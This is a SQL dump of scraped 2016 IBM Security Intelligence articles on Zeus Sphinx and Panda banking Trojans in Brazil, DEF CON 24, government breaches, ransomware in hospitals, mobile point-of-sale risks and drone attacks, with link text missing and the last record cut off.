INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (205, 'Brazil Can’t Catch a Break: After Panda Comes the Sphinx', 'Limor Kessem', '2016-8-16', 'Within two weeks of the   ( ) activity, IBM X-Force researchers have uncovered the first signs of Zeus Sphinx attacks in Brazil. A new version of Zeus Sphinx, which is, like Panda, also a commercially available Zeus v2 variation, now targets the online banking and Boleto payment services of three of the top Brazilian banks and one bank in Colombia, according to its configuration file. Sphinx is a modular banking Trojan and considered to be as sophisticated as Panda and Zeus Citadel. The timing of Sphinx’s migration to Brazil — while the country is hosting a global sporting event — hardly appears to be a coincidence. Cybercriminals are known to increase their efforts during sporting events, taking advantage of the rise in online activity and interest around the competition to lure users into opening malware spam and phishing pages. Zeus Sphinx is a banking Trojan and is a commercial offering sold to cybercriminals via underground fraudster boards. The malware emerged in August 2015, at which point it started   This malware was known to primarily target European entities until recently. So, another day, another Zeus? Not quite. Sphinx has been around for about a year now, launched initially in attacks targeting U.K. and Australian banks. X-Force Research analyzed Sphinx’s modus operandi at the time and found that the malware combined elaborate fraud tactics to steal credentials and one-time passwords. Sphinx’s configuration fetched webinjections in real time from its command-and-control (C&C) server, manipulated users to generate authentication codes with their card readers and even tricked victims into downloading a malware app to their mobile device to steal transaction authentication codes sent from the bank via SMS. According to X-Force researchers, the Brazilian iteration of Zeus Sphinx, which is dubbed Sphinx v2, most likely comes from the same developer and is customized to target local banks. Aside from social engineering injections that ask for payment card PIN codes and PII, Sphinx v2 has been adapted to rob Boleto payments from infected victims. For those that aren’t familiar with Boleto payments, think of them as something similar to a money order in the U.S. According to X-Force researchers,   for Brazilian malware authors for the past few years, with one estimate   in fraud losses to just one cybercrime faction that targeted Brazilians from 2012 to 2014. The typical Boleto fraud malware is facilitated by various codes, which are specifically designed to poison and rob payments from infected user endpoints. But in the case of Zeus Sphinx v2, stealing Boletos is just one of the malware’s preconfigured theft mechanisms, enabled by real-time man-in-the-middle (MitM) webinjections. The Boleto fraud begins when infected users initiate a Boleto Bancario during their online banking session. At that moment, the malware identifies that a Boleto is being prepared and triggers a set of JavaScript injections. Sphinx collects the victim’s Boleto data and sends it to the criminal’s C&C. On the server side, the C&C reaches out to a legitimate open source API library that creates Boleto barcodes from transaction details defined by the user. This happens without involving the bank’s server, where the victim’s original Boleto barcode should come from. Instead, the criminal-generated barcode contains the routing data to a mule account and a modified transfer amount. Since the barcode is not readable by humans, the victim cannot tell there is any issue with the barcode response that appears to come from the bank. Ultimately, the rendered barcode the victim unknowingly sends out is the poisoned Boleto request, which effectively reroutes the payment to the criminal. This Sphinx feature automates the fraud and does not require manual intervention from the cybercriminal behind the malware until the actual cashing out of the Boleto payment. Zeus Sphinx, which is based on the   of the Zeus Trojan, targets retail banking and Boleto payments of banks in Brazil and Colombia. The malware adapts social engineering injections to manipulate users in each targeted bank. While in some cases Sphinx webinjections only ask victims to provide passcodes and PII, in others it also requires payment card PIN codes as well as the person’s home and mobile phone numbers. The latter case is interesting because it tells the story of fraud that’s typical to Brazil: mixing digital and physical social engineering to scam victims and empty their accounts. In these schemes, fraudsters may start off the chain by stealing online banking details. Then, to obtain more information, they may supplement their scams with phone calls to the victims. After the recent spread of Zeus Panda to Brazil, Sphinx’s move to the country may mark the beginning of a trend that will add to   — a landscape that has been, until now, dominated by relatively simplistic Delphi-based malcode. This migration of yet another commercial Zeus variant into Brazil further underscores the trending collaboration between Brazil-based cybercriminals and cybercrime vendors from other countries and underground communities — a movement that has been picking up speed in the country since the beginning of 2016. Judging by recent emerging campaigns observed by X-Force Research, Zeus Sphinx appears to be an active and evolving project, commercialized to cybercriminals through Dark Web forums. As such, we may see more variations of this malware in the coming months and an expanding list of targets in Brazil. IBM Security is familiar with Zeus Sphinx and its various attack schemes. To help thwart Sphinx, banks can use adaptive   and   with malware intelligence that provides real-time insight into fraudster techniques and capabilities. To prevent malware infections on their endpoints, users should make sure their operating system and frequently used programs are up to date at all times. When browsing, users should disable ads and avoid sites typically prone to infection, such as those hosting adult content, torrents and free gaming. Most importantly, users should avoid clicking on links or attachments in unsolicited email. A sample MD5 hash for the Zeus Sphinx Trojan is 03915A1F03DF164F48AC4DFD04D9C2C4. Antivirus aliases include Trojan-Spy.Win32.Zbot, according to  . IBM X-Force Research will be updating information and IOCs on Zeus Sphinx via the  . Join XFE today to keep up to date regarding this threat and other findings from our cybercrime labs.', '\'Banking Trojan\', \'Cybercrime\', \'IBM X-Force Research\', \'Trojan\', \'X-Force\', \'Zeus\', \'Zeus Malware\', \'Zeus Panda\', \'Zeus Sphinx\'', 'https://securityintelligence.com/brazil-cant-catch-a-break-after-panda-comes-the-sphinx/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (206, 'Impressions From DEF CON 24: The Machines Are Rising', 'Paul Ionescu', '2016-8-11', 'DEF CON 24, the world’s largest hacker conference, ended Aug. 7, and I must say I enjoyed every moment of it. There was so much to see in so little time; I definitely regret missing some great stuff that happened. Even so, I still managed to catch some very interesting events that I would like to highlight. The theme of the conference was “Rise of the Machines,” and the machines undoubtedly rose. The main event was the  , an occurrence of historic proportions. The challenge pitted autonomous hacking machines against each other in a Capture the Flag (CTF) contest created in the likeness of the regular contests that occur every year at DEF CON. The machines were fed buggy software in compiled form. They were then asked to analyze the software for flaws, patch it dynamically and even develop exploits. The machines absolutely succeeded. Even more amazingly, they identified   of which the creators of the challenge were not even aware. \n \n Mayhem, a system created by Carnegie Mellon University, won the challenge and the $2 million prize. After defeating its computer counterparts, Mayhem went on to participate in the annual DEF CON CTF against actual human teams. Based on the information that emerged, Mayhem was successful in solving at least some challenges, but eventually lost out to human teams. If you’re like me, you’re probably dying to know how the hacking machines actually work. To find out more, I attended the talk held by the Shellphish CTF team from the University of California, Santa Barbara (UCSB), which placed third in the challenge. Mechaphish, the hacking system developed by UCSB, used a combination of dynamic analysis (fuzzing), binary analysis and symbolic execution to identify vulnerabilities. Tools used for the purpose were American Fuzzy Loop (AFL), a well-known fuzzer, and ANGR, a binary analysis and symbolic execution platform developed by UCSB. The team used AFL to input a huge amount of number and character variations in the code paths identified by ANGR. A crash in the tested binary indicated a memory violation. Weaknesses targeted and identified in the contest were limited to memory-related flaws — not so much the usual injection and crypto issues that we are seeing every day. In addition to identifying the vulnerabilities, the machine both exploited and patched the issues by writing its own code, which is even more outstanding. However, the team ran out of time and had to describe these techniques hastily without much detail. The entire Mechaphish code will be made available on Github. During the closing ceremony, DARPA’s Mike Walker expressed hope that machines and humans will work together and not against each other, making an analogy to computer-augmented chess. It does seem, however, that just like in the “Matrix” universe, the humans were the first to attack, albeit to make the machines safer and prevent other humans (cybercriminals) from taking advantage of the flaws. During the conference, humans presented a large variety of attacks conducted against unsuspecting self-driving cars, solar arrays, seismographs, drones, speedometers, surveillance cameras, SCADA controllers and more. Below are some more examples of human aggression against machines at DEF CON 24: Jianhao Liu, Chen Yan and Wenyuan Xu, researchers from Zhejiang University presented extremely thorough research showing how the  , leading to accidents. The deafening was achieved by jamming the ultrasonic and MMW radar sensors of various cars. The attack resulted in the car’s self-parking feature failing to detect obstacles and hitting the researchers. The researchers conducted the blinding attack using a laser, which was quite scary since it can result in permanent destruction of the onboard cameras.   \n IoT enthusiast and security expert Fred Bret-Mounet   by attacking its web administration interface with basic SANS 25 items such as predictable login credentials, path traversal and command injection. Once he was able to execute commands, Bret-Mounet found out that the solar array was connecting him to other customers through a common VPN subnet. Imagine that your personal documents stored on some network share could be accessed by others using their own array. Owners of an IoT search engine described how they found and accessed a sensor that detects earthquakes through an unauthenticated web administration page. The $30,000 device was placed at the bottom of the ocean and, as it turns out, is accessible over the internet. This presentation is an example on how not to conduct security research. The two hackers executed security tests on a live scientific device even after the company explicitly removed its authorization from support materials. They could have bricked a very expensive device, and it is not clear from the talk that the responsible disclosure process was even followed, so the company may still be unaware of the issues. Still, this painful story highlights the dangers of ignoring computer security. It is well-known that the cost of security bugs is much higher post-release, but can you imagine the cost to this company? To conduct repairs, the company may have to retrieve all affected devices from the bottom of the ocean! Trend Micro ZDI senior manager Brian Gorenc, with security researcher Fitz Sands, provided   of over 100 vulnerabilities in SCADA controllers provided to the company through its bug bounty program. Most prominent vulnerability types were memory corruption, credential management, insecure defaults, authentication/authorization and injection. The researchers quickly concluded that SCADA devices were “not built with security in mind.” The same basic SANS 25 vulnerability types and a disregard for security were common themes across the other DEF CON talks, and also in our own   research on  . Besides application developers, most security professionals are probably unprepared to deal with unusual applications of software and data transmission standards. But one thing is clear: Software now lives in the most unexpected places and is almost always connected to the internet. We need to change the mentality that only traditional applications require application security testing. Should you point an automated scanner to the web interface and source code of a solar panel, router, SCADA controller or seismograph? Absolutely! It will help find the path traversal and injection issues before they are featured on the stage in Las Vegas in front of thousands of hackers. You can also hire the likes of the DEF CON crowd to perform penetration tests before your product is released. Check the   for more outstanding content.', '\'Bug Bounty\', \'Connected Devices\', \'DEF CON\', \'Hacking\', \'Internet of Things (IoT)\', \'SCADA\', \'Security Conferences\', \'X-Force\'', 'https://securityintelligence.com/impressions-from-def-con-24-the-machines-are-rising/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (207, 'Government Data Woes: 2016 Compromised Records Surpass Total for Last Three Years Combined', 'Michelle Alvarez', '2016-8-10', 'We are only a little over halfway through 2016, and yet according to the latest  , 200 million government records worldwide were already compromised by July 31 of this year. That’s nearly 60 million more than all the records compromised from 2013 through 2015 — combined. What’s behind this spike? The U.S. is the clear leader in terms of the number of security incidents where government records were compromised over the last several years. This makes sense when you consider the sheer number of state and local government organizations: According to the  , there were 90,056 state and local governments in the U.S. But the issue of government breaches is not confined to the U.S. It is a global problem, with close to 100 reported incidents spanning across 29 countries and six continents. Government entities have been targeted by malware infections, phishing schemes and SQL injection attacks. Compromised information includes national ID numbers, fingerprints, confidential documents and emails, passwords, and credit card numbers of private citizens, current and former government employees, and military personnel. Attackers use this information to conduct further fraudulent and malicious activity. One popular move is to take stolen information and put it up for sale on the Dark Web, as was the case with the   in 2015. , often motivated by political or social interests, played a role in several of these incidents. In March, hacktivists posted over 300 GB of Filipino voter data from the country’s electronic election website,   noted. More than half the estimated population of the Philippines was exposed by this leak, including hundreds of thousands of email addresses linked to passport info, fingerprints, family history and other sensitive information. Health care records are still all the rage for cybercriminals. In fact, a   showed that the health care industry continues to represent a growing percentage of all data breaches — 15 percent in the first half of 2016 (through June 1), up from 9 percent in 2015. So, why the jump in compromised government records as well? Attackers are not one-dimensional. They are capable of setting their sights on multiple targets, and they are equally adept at launching myriad attacks — from DDoS extortion attempts to targeted banking malware campaigns to   attacks. Congruent trends are often found across the threat landscape. Attackers will go wherever there’s money to be made. They’re financially motivated, which is why they target industries such as health care and government. The wealth of information within a government record can be just as valuable as a health care record, if not more valuable because of what can be done with it. These records could be used to pivot to other schemes, gain access to confidential information or file fraudulent tax returns, for example. Furthermore, although the percentage of government security incidents as a total of all security incidents has risen slightly this year over the previous year through July 31, there had been a notable decline for the previous three years: 2013 (14 percent), 2014 (10 percent) and 2015 (7 percent). The significance of the 2016 breaches is not necessarily the rise of incidents per se (it’s too soon to tell), but rather the magnitude or impact of these incidents. Another reason for the apparent surge in incidents in 2016 could actually be the result of increased reporting. At least in the U.S., the Office of Management and Budget (OMB)   to security incident reporting for federal executive branch agencies. Of the government security incidents where the attack type was known and the attack resulted in the compromise of data (a little over two-thirds of the incidents), SQL injection attacks were responsible for 45 percent since 2011. SQL injection attacks are clearly impacting the government sector. Interestingly, though, the last incident where SQL injection was the known attack vector targeting a government organization occurred in 2014. However, there have been numerous data compromises since then in which the attack type has not yet been publicly confirmed, but SQL injection is suspected since it continues to be a prevalent attack vector. An   indicated that there was an 87 percent increase in SQL injection attacks in Q1 2016 compared with the previous quarter. We know the attacks are occurring, we’re just not hearing about them as much from a public disclosure standpoint. In contrast, there have been several high-profile breaches of government data in the past couple of years where a security misconfiguration was identified as the reason behind a data leak. Most notably, over 93 million records containing Mexican voter data were   due to an improperly secured public-facing cloud database. Leaked data included names, voter identification numbers, addresses, dates of birth and other sensitive information. Prior to this incident,   on a U.S. political party website exposed the personal information of over 2 million individuals, including names, addresses, birthdates and voter information. It’s imperative that governments implement a comprehensive data security platform. Look for a data security solution that can detect SQL injections and malicious stored procedures and identify when a data repository attack is underway, whether it’s an inside or outside attacker. Since SQL injection holes in web servers and applications seem to be an open door to many government databases, a focus on application security is a must. Tools such as   can reduce the likelihood of web application attacks and data breaches by automating application vulnerability testing and finding issues such as lack of input validation. Beyond open SQL injection vulnerabilities, these tools can help find other OWASP top 10 web application risks before the application hits production. Unfortunately, misconfiguration can make a relatively secure app vulnerable. For example, implementing a firewall rule such as   allows all traffic from any source to a web server. Or what about leaving an open port on a web server running or granting the wrong permissions to a UNIX web server that allows for external or unapproved access to an app or service? System misconfigurations are one of the more common forms of human error resulting in inadvertent  . In the past, it appears that either the government sector has been less affected by security breaches than the private sector or the breaches were not known to the public. The good news? With this growing spotlight on government, there have been several examples of agencies recognizing the need to take steps to improve data security. The U.S. OPM released a report following the aforementioned breach on its systems identifying current and future actions to strengthen cybersecurity and protect critical IT systems. In Europe, the   was signed into law in May, with the goal of strengthening and unifying data protection for citizens of the European Union. Let’s hope these are indicators of positive movement toward better government data security globally.', '\'Cybercrime\', \'Federal Government\', \'Federal Government Security\', \'Government\', \'Security Awareness\', \'Threat Intelligence\'', 'https://securityintelligence.com/government-data-woes-2016-compromised-records-surpass-total-for-last-three-years-combined/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (208, 'Using Feedback Loops to Enhance End User Security', 'Robert Lelewski', '2016-8-9', 'The security world abounds with case studies demonstrating that end users are a weak point within the organization. End users are constantly bombarded by phishing attacks, are notorious for using weak account credentials and are preyed on by malware relying on the user to introduce malicious software into an environment. All of these examples may lead to significant damage to the organization and negative headlines. Unfortunately, despite significant efforts, end user security issues continue to stymie even the most well-funded and resourceful security teams. Even with  , new hire training, annual security certifications and periodic emails from an exasperated security teams pleading to think twice before clicking on a link, end users continue to introduce and ferment risk within an environment. It’s safe to assume that most end users have good intentions and are not actively trying to open the doors for the bad guys. So why does the end user continue to be the weakest link? Perhaps we need to adjust how we interact with end users. A feedback loop consists of four unique stages: One method to illustrate the feedback loop in the information security realm is via   exercises. These are exercises sanctioned and conducted by the organization to identify users that are prone to clicking on malicious links. Spear phishing training exercises are an excellent method to correct unwanted end user behavior. Demonstrating the exercise in a feedback loop, an end user first clicks on a spear phishing email that, ideally, should be recognized as malicious. The first step in the feedback loop has been satisfied. As soon as possible after the user clicks on the link, the individual should be educated on what happened and how to avoid the same mistake in the future, per the second step. The third step is informing users of the consequences of their actions. This should be done both from an information security aspect (i.e., what the ramifications were to the state of security within the organization) and from a human resources perspective. No one is advocating formal disciplinary actions over clicking on a link in a test. However, repeat and frequent occurrences may warrant additional attention. Finally, the fourth step, retesting participants, is necessary to ensure they have learned from the affair and the unwanted behavior has been corrected. While the basic steps of the feedback loop are equally important, attention must be given to their temporal spacing. If it takes three months to notify users of their unwanted behavior, the ability to learn from that behavior is diminished. The more closed the feedback loop is, the more likely the end user behavior will be adjusted. While the example above focuses specifically on spear phishing, the feedback loop can be applied to a variety of other user practices, such as unwanted web browsing, the installation of unapproved software packages and so on. Teaching end user security can significantly drive awareness. It is potentially a powerful and effective force multiplier to your security posture. When   respond to computer security emergency events, a lack of end user security awareness is too often the root cause.', '\'Security Awareness\', \'Spear Phishing\', \'User Education\'', 'https://securityintelligence.com/using-feedback-loops-to-enhance-end-user-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (209, 'When Souvenirs Cost More Than Pocket Change: Mobile Point-of-Sale Hazards', 'Charles Henderson', '2016-8-9', 'Mobile point-of-sale (POS) technology presents easy options to small merchants that used to accept cash only — from hot dog vendors to Girl Scouts selling cookies. Large   have also deployed mobile POS to enable employees to check out customers from anywhere in the store, completely bypassing traditional lines. Because of these advantages, mobile POS is certain to be very popular at large global sporting competitions. Mammoth events typically attract pop-up merchants hawking souvenirs, drinks or even parking spaces. If they have a smartphone, they can get an inexpensive — or even free — attachment to accept payment cards. However, these same large events may also attract thieves and con artists out to steal card numbers through malware, hardware skimming or anything else that works. A particular risk to small businesses comes from the common practice of doing business on personal phones. The business is only as safe as the riskiest behavior of its employees; any malware infection can impact the business if a compromised personal phone is used as a mobile POS. The good news is that the technology is improving. Five years ago, every card swiped on a compromised mobile point-of-sale terminal could theoretically be retrieved by criminals. Modern card readers can encrypt the card holder’s data before it ever reaches the mobile device, significantly mitigating the risk of malware. Of course, technical innovation is never a panacea against criminals. Innovation is only effective if it is implemented; smaller merchants may not adopt the latest and greatest technology. Similarly, while cards with chip-and-PIN technology provide excellent protection against card duplication, using them is not without risk because they don’t encrypt the card number. That is left up to the card reader, just as it is with magnetic stripes. A successful attack will affect both the merchant and consumers, but the risks and mitigation strategies are very different for each. In some countries, consumer liability is capped for fraudulent card transactions and may be entirely waved by the bank that issued the card. In those cases, the consumer’s risk is primarily the inconvenience of documenting fraudulent charges and waiting for a replacement card. Of course, if you’re  , especially internationally, suddenly having your primary payment card canceled can be a major disruption. In other countries, consumer liability may be capped only for card-not-present transactions such as online purchases. Some regions that have fully adopted chip-and-PIN purchasing have pushed the liability for all fraudulent PIN transactions to the consumer. In those cases, the secrecy of your PIN is paramount. If you’re unsure about your liability, contact the bank that has issued your payment card. It should be able to explain the policy, allowing you to make an educated risk decision. Regardless of your personal liability, there are some steps that you can always take to minimize your risk: Addressing mobile point-of-sale risk is very different for merchants. Responsible merchants and POS software providers engage security companies to manually test their solutions. That’s an important step, even for veteran development teams. A perfect security design can easily be brought down by a simple implementation flaw. Skilled testers can simulate malicious attacks to discover both design and implementation flaws. Hopefully, this will confirm that the solution is secure. However, we have seen even major retail chains fundamentally fail at their mobile POS deployments. On more than one occasion a merchant’s security plan has boiled down to who is handling the mobile device. That might be viable for a small business, but it can’t scale beyond a few employees. For large deployments, merchants have to assume that someone bad has gotten their hands on the tablet or phone. That’s true for traditional  , but critical for mobile products. A criminal is unlikely to walk out the door with an entire cash register, but could easily put an unused tablet under his shirt, take it to the bathroom, install malware and return it in under five minutes. The staff are more likely to be relieved at having found it than suspicious about its integrity. A strong deployment strategy will utilize   to monitor device security. The MDM policy can require that the operating system is patched, that the device is not rooted or jailbroken, that only authorized software is installed and that security settings like lock passwords are properly configured. Just like any other tool, MDM isn’t perfect, but it can make a successful attack far more complicated for criminals. Not all MDMs are created equal. We tested one solution that required that all software updates be signed by a specific encryption key — all software updates, but not all configuration updates. For example, no signature was required to update the file containing authorized keys for signing software updates. As a result, the great idea of signed software could be easily bypassed by adding an encryption key controlled by the attacker. Whether you’re a consumer, merchant or POS provider, payment cards and mobile POS technologies have associated risks. Consumers have security controls, like being thoughtful about where they use cards, and must verify the results by reviewing their account statements. Merchants and POS providers must use controls like MDM and verify the results through penetration testing.', '\'Mobile\', \'Mobile Payments\', \'Payment Card Industry (PCI)\', \'Payment Card Industry Data Security Standard (PCI DSS)\', \'Point-of-Sale (POS) Systems\'', 'https://securityintelligence.com/when-souvenirs-cost-more-than-pocket-change-mobile-point-of-sale-hazards/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (210, 'Ransomware and Health Care: There’s More at Risk Than Just Money', 'Michael Ash', '2016-8-8', 'Although they still target medical records, cybercriminals are quickly realizing there is fast money to be made not just in stealing health care data, but also in shutting down hospitals completely and then waiting to be paid. With ransomware, there’s more at risk than just money. Patient safety, reputation and the rising costs of potential fines are pushing health care organizations to take a fresh look at their security programs and make the required investments to prevent ransomware attacks. Thanks to strapped budgets, planning protection, prevention and emergency response for critical IT systems is not all that different than planning for a potential physical medical emergency. In a  , Jocelyn Samuels, Director of the HHS Office for Civil Rights, said: “One of the biggest current threats to health information privacy is the serious compromise of the integrity and availability of data caused by malicious cyberattacks on electronic health information systems, such as through ransomware.” Prevention and protection are essential, since paying cybercriminals doesn’t always guarantee getting your information back. Researchers have discovered a ransomware variant that just deletes your files even if you pay,   reported. The health care industry continues to undergo significant changes in security risk, driven by rapid digitization, changing patient expectations, regulatory pressures from Health Insurance Portability and Accountability Act (HIPAA) and limited budgets. , once in the top 10, have moved to No. 1 in terms of the number of records compromised. These breaches represent a big payoff for cybercriminals, according to the  . Considering a stolen medical record is worth more than 10 times a stolen credit card, it’s easy to see why health care is a prime target. Health care record theft is up 1,100 percent this past year, with more than 100 million records compromised worldwide, according to X-Force research. Stated another way, every third person had a health care record compromised in 2015. In addition, health care security spending is at times as little as one-tenth what other industries spend, a   found. With limited technical staff, the need for easy physician and patient access, and an infrastructure that by nature has to include integrated components from multiple vendors, health care is an easy target for cybercrime. Even though medical records contain rich personal health information (PHI) that can be sold for high value, cybercriminals are discovering they can get faster payment through ransomware. Unlike stolen medical records that take time to acquire and commoditize, ransomware locks health care out of critical systems and demands payment or action immediately. Although ransomware has been around more than 10 years, its   is significant since physicians are so dependent on critical, real-time patient data such as scheduling, lab results and pharmacy orders. Without access to computerized patient data, many hospitals and clinics are frozen in their tracks. Unlike other industries where access to data is not as time critical, being locked out of patient data could be life threatening. Data criticality and limited cybersecurity programs make health care a prime target for ransomware, and this risk will continue to increase. \n In a ransomware attack, how do cybercriminals attack health care infrastructure, encrypt data and then demand payment to recover access? Although the standard vector is malicious email attachments — the most common being Word documents, Adobe files, archives and JavaScript — other vectors include links to booby-trapped websites, compromised websites, malicious web ads, malware links in social networking posts and unpatched versions of Microsoft Office and Adobe Reader or Flash. According to  , 28 percent of overall vulnerability disclosures in 2015 targeted web applications. Once an organization is infected, the data can be encrypted, with the cybercriminals willing to swap decryption key for untraceable bitcoin. So why is ransomware on the rise in health care? A recent survey carried out by the   found that 41 percent of respondents hit by this type of malware paid the ransom. Each payment encourages future attackers to do the same thing. Ransomware takes less time and effort compared to stealing medical records, so the cost/benefit is favorable for cybercriminals. There have been at least eight hospitals already hit in 2016, and these are only the subset that have reported a compromise to the press. The CryptoLocker strain of ransomware alone stole some $27 million in just six months from those organizations whose data was taken hostage. The   reported that incidents of ransomware are on the rise. One of the biggest problems is that simply paying the ransom doesn’t always fix the issue. Some hospitals that paid the ransom were more than disappointed when the cybercriminals came back and  . The problem is even bigger than previously reported. According to  , “the Health Information Trust Alliance conducted a study of some 30 midsized U.S. hospitals late last year and found that 52 percent of them were infected with malicious software,” which is a vector for ransomware attacks. The standard ransomware process follows three common steps: infection, execution and payoff. Although one option is paying the ransom, it is far better not to be attacked in the first place, especially with new ransomware versions that just delete your data regardless of payment. Prevention is the key! To implement an effective prevention and  , you should: The IBM X-Force Incident Response Service’s white paper, “ ,” provides additional preventative and containment measures. Although user training, investment in preparedness, and implementation of key security controls and practices will not guarantee the prevention of an attempted breach, it will make it much more difficult for those who wish to target your organization, your patients and your staff.', '\'Data Breaches\', \'Data Protection\', \'Electronic Medical Records (EMRs)\', \'Healthcare Data Breach\', \'Healthcare Industry\', \'Healthcare Security\', \'Personally Identifiable Information (PII)\', \'Ransomware\'', 'https://securityintelligence.com/ransomware-and-health-care-theres-more-at-risk-than-just-money/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (211, 'Panda Is One Hungry Bear! A Heavyweight Banking Trojan Rolls Into Brazil', 'Limor Kessem', '2016-8-4', 'IBM X-Force Research observed that a relatively new Zeus Trojan variant known as Panda, or  , that started targeting banks in Europe and North America early this year has now spread to  . According to IBM X-Force Research, Panda now targets 10 local bank brands and multiple payment platforms right as Brazil prepares to host a global sporting event. As its name suggests, Zeus Panda is yet another Zeus v2 Trojan iteration built upon the same   — one that evidently keeps enabling the delivery of more commercial banking Trojans into the world. IBM X-Force Research believes that Zeus Panda is being peddled via Dark Web underground boards by the developer who put it together. It is sold in cybercrime-as-a-service packages to other cybercriminals. IBM X-Force Research has been detecting Zeus Panda variants since Q1 2016. At first, botnets spreading and attacking users with this malware primarily targeted banks in Europe and North America, focusing on the U.K., Germany, the Netherlands, Poland, Canada, the U.S. and others. While Panda configurations focus on targeting personal online banking services, they are rather diverse. Other targets include online payments, prepaid cards, airline loyalty programs and online betting accounts, to name a few. Panda is clearly one hungry bear. The malware continues to spread to new geographies and is now targeting users in Brazil. First appearing in Brazil in July 2016, the related Panda variant likely has links to a locally operated, professional cybercrime faction. The variants fetched a new Brazil-focused configuration, which was set up to steal credentials from users of 10 major bank brands in the country, as well as those of bitcoin exchange platforms, payment card services and online payments providers, among others, per X-Force findings. Zeus Panda’s Brazilian configuration file has a notable local hue. Aside from including the URLs of major banks in the country, Panda’s operators are also interested in infecting users who access delivery services for a Brazilian supermarket chain, local law enforcement websites, local network security hardware vendors, Boleto payments and a loyalty program specific to Brazil-based commerce. Other targets include customer logins to a company that offers ATM management services and secure physical access technology for banks. Who is behind this new botnet? Attribution remains elusive. However, from the attack flows analyzed by X-Force Research, it is evident that Brazil’s Panda gang is very well-versed in the operation of banking Trojans of this grade. In comparison to other Zeus Panda botnets, and most banking Trojan configurations in general, this Brazilian iteration suggests the involvement of a professional cybercrime group that is at least partly located in Brazil. A hint pointing to Panda’s operators’ possible origins is the URL of a Russia-based online service that helps users with instant money transfers, payments, top-up and output via online payments platforms, payments through mobile operators and more. Is there anything special about Zeus Panda at this time? The malware is based on existing code and performs the same online fraud methods that X-Force researchers see with other banking Trojans. Panda grabs login credentials on the fly, is capable of injecting malicious code into ongoing web sessions to trick users with social engineering, and its operators are versed in the use of automated transaction panels (ATS). According to attack attempts detected by IBM Security  , Panda’s operators’ favored fraud methodology is account takeover, in which victim credentials are stolen and then used to initiate a transaction from another device. The victim is held online by deceptive pop-up windows that require one-time passwords and allow the attacker to complete a fraudulent transaction in real time. Zeus Panda’s top infection vector is poisoned Word documents with macros that activate the malware deployment on victims’ machines. It has been seen to spread via popular exploit kits, such as Angler and Neutrino. It also targets company email addresses with personalized messages designed to lure victims on a more selective basis than indiscriminate spam. Under the hood, this Trojan does feature a few modifications, mostly relevant to its encryption and communications schemes, which were recently  . From a global perspective, Zeus variations remain one of the most dominant malware problems to affect the financial sector. Looking back at the past five years, Zeus-based banking Trojans maintained one of the top ranks on the global malware chart based on the attack volumes they facilitate. Figure 1 lists the top financial malware in the world for the first half of 2016. Ranking third is the Zeus variations line, which accounts for 15 percent of attacks worldwide and includes Zeus VM, Citadel and Panda variants, as well as generic Zeus v2 deployments operated by small cybercrime factions in different parts of the world. Panda’s move to Brazil is a very interesting occurrence in the country.   is dominated by relatively simplistic codes designed for specific fraud scenarios, such as Boleto fraud, remote access fraud and malware used for phishing. Zeus Panda may not be the first ever modular banking Trojan to operate in Brazil, but it is definitely a major step up from the malicious Delphi-based malcode that’s so typical in the country. This migration of a new and commercial Zeus variant into Brazil also underscores the growing collaboration between Brazil-based cybercriminals and cybercrime vendors from other countries and underground communities — a trend that has been picking up speed in Brazil since the beginning of this year. Judging by recent emerging campaigns observed by X-Force Research, Zeus Panda appears to be an active and evolving project that is being commercialized to cybercriminals through Dark Web forums. As such, we expect to see more variations of this malware and new botnets appearing in the coming months, likely targeting different countries beyond those appearing in current configurations. In the last few years, malware developers have been disinclined to sell banking Trojans in the underground for fear of being discovered by law enforcement. Panda’s vendor may or may not continue to sell the malware at the risk of encountering the same fate that   in the recent past. IBM Security has studied the Zeus Panda banking malware and its various attack schemes and can help banks and targeted organizations learn more about this high-risk threat. To help stop threats like Panda Banker, banks and service providers can use adaptive   and   with malware intelligence that provides real-time insight into fraudster techniques and capabilities, designed to address the relentless evolution of the threat landscape. Users looking to prevent malware infections on their endpoints must keep their operating system up to date at all times, update frequently used programs and delete those they no longer use. Browsing hygiene for the prevention of Trojan infection includes disabling ads and avoiding susceptible sites typically used as infection hubs, sites such as adult content, torrents and free gaming, to name a few. Also, since Panda Banker and similar banking malware is usually delivered as an email attachments, never click on links or attachments in unsolicited email. Sample MD5 hashes for the Panda Trojan are: AV aliases include Gen:Variant.Graftor.296387, according to  . IBM X-Force Research will be updating information and IOCs on   via the  . Join XFE today to keep up to date regarding this threat and other findings from our cybercrime labs.', '\'Banking Trojan\', \'Brazil\', \'Fraud\', \'IBM X-Force Research\', \'Malware\', \'X-Force\', \'Zeus Panda\'', 'https://securityintelligence.com/panda-is-one-hungry-bear-a-heavyweight-banking-trojan-rolls-into-brazil/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (212, 'Are Drone-Led Cyberattacks the Wave of the Future?', 'Brooke Satti Charles', '2016-8-4', 'Israel recently agreed to purchase a series of F-35 Lightning II Joint Strike Fighter jets from Lockheed Martin, with the first scheduled to arrive later this year. The F-35 Lightning is one of the most advanced fighter jets in the world, reportedly able to conduct electronic countermeasures.\n The computing capabilities of the F-35 allow for real-time intelligence sharing with both air and ground forces, making this jet a leader in intelligence gathering with meticulous striking capabilities. As the speed of innovation continues to accelerate, it’s easy to imagine this technology becoming available to civilians — not to mention cybercriminals.\n Will drones, whether military, commercial or civilian, be used to facilitate targeted physical and logical attacks against organizations in the future? Drones are still relatively new in the consumer space, but the industry is continuously growing.\n While every country controls its airspace differently, the   suggested that hobbyists and commercial entities in the U.S. should register all drones. As we know, however, criminals and other bad actors don’t follow laws and regulations.\n Could fraudsters  ? It’s not that far-fetched. In 2015,   revealed that a spyware vendor, Hacking Team, and a subsidiary of Boeing had considered designing a drone capable of intercepting communications and infecting targets using Wi-Fi networks nearby.\n Additionally, researchers at   have developed a way to deploy drone-led man-in-the-middle (MitM) attacks to eavesdrop on wireless print jobs by exploiting wireless printing networks within organizations. 